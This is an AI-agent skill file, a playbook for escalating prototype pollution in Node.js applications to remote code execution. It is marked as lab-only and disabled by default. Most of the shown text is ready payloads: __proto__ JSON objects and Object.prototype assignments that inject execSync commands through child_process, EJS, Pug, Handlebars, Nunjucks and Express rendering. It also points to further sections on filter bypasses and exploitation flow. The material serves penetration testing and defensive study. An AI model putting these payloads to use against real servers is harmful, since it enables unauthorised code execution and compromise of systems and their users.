---
name: prototype-pollution-advanced
description: >-
  Advanced prototype pollution playbook — server-side RCE, client-side gadgets, filter bypasses, and detection techniques. Companion to ../prototype-pollution/ for basics. Use when you've confirmed pollution and need to escalate to code execution or find framework-specific gadgets.
---

# SKILL: Prototype Pollution Advanced — RCE & Gadget Exploitation

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Advanced prototype pollution escalation. Covers server-side RCE via template engines (EJS, Pug, Handlebars), Node.js child_process gadgets, client-side script gadgets, filter bypass patterns, and systematic detection. Route to `prototype-pollution` first for fundamentals (merge sinks, `__proto__` vs `constructor.prototype`, basic probes).

## 0. RELATED ROUTING

- `prototype-pollution` — prerequisite route for PP fundamentals, merge-sink detection, and basic probes; resolve this route before the Run
- `ssti-server-side-template-injection` — template engine RCE context (PP often triggers through template gadgets)
- `xss-cross-site-scripting` — client-side PP gadgets ultimately achieve XSS

### Advanced Reference

Inspect [KNOWN_GADGETS.md](./KNOWN_GADGETS.md) for the comprehensive gadget table by framework/library with polluted properties, trigger conditions, impact, and affected versions.

---

## 1. SERVER-SIDE PP → RCE

### 1.1 Node.js child_process.spawn — Shell/ENV Injection

When `child_process.spawn` or `child_process.fork` is called without explicit `env`/`shell` options, it inherits from `Object.prototype`:

```javascript
// Vulnerable pattern (very common):
const { execSync } = require('child_process');
execSync('ls');  // inherits shell, env from prototype

// Pollution for RCE:
Object.prototype.shell = '/proc/self/exe';
Object.prototype.argv0 = 'console.log(require("child_process").execSync("id").toString())//';
Object.prototype.NODE_OPTIONS = '--require /proc/self/cmdline';
// Next child_process call executes attacker code
```

Alternative ENV pollution:

```json
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}}
```

### 1.2 EJS (Embedded JavaScript Templates)

EJS `render()` reads `opts` from object properties. Polluting `outputFunctionName` injects code into the compiled template function:

```json
// Pollution payload:
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

// When EJS renders ANY template after pollution:
// Compiled function includes: var x;process.mainModule.require('child_process').execSync('id');s = "";
// → RCE
```

Detection: any EJS `res.render()` call after pollution triggers it.

### 1.3 Pug (formerly Jade)

Pug's compiler reads `block` from object properties:

```json
{"__proto__": {"block": {"type": "Text", "val": "x]);process.mainModule.require('child_process').execSync('id');//"}}}
```

Alternative via `self` option:

```json
{"__proto__": {"self": true, "line": "x]});process.mainModule.require('child_process').execSync('id');//"}}
```

### 1.4 Handlebars

Handlebars template compilation checks `type` and `program` on template AST nodes:

```json
{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "path": {"type": "PathExpression", "original": "constructor.constructor('return process.mainModule.require(`child_process`).execSync(`id`)')()","parts": ["constructor","constructor"]}, "params": [], "hash": null}]}}
```

Simpler via `allowProtoMethodsByDefault`:

```json
{"__proto__": {"allowProtoMethodsByDefault": true, "allowProtoPropertiesByDefault": true}}
// Then use {{#with this as |obj|}}{{obj.constructor.constructor "return process.mainModule.require('child_process').execSync('id')"}}{{/with}}
```

### 1.5 Nunjucks

```json
{"__proto__": {"type": "Code", "value": "global.process.mainModule.require('child_process').execSync('id')"}}
```

### 1.6 Express res.render (Generic)

When Express calls `res.render()`, options merge with `app.locals` and `res.locals`. Polluted prototype properties appear as template variables:

```json
{"__proto__": {"view options": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}}
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 2. CLIENT-SIDE PROTOTYPE POLLUTION
- 3. DETECTION TECHNIQUES
- 4. BYPASS `__proto__` FILTERS
- 5. EXPLOITATION FLOW
- 6. DECISION TREE
- 7. QUICK REFERENCE — KEY PAYLOADS
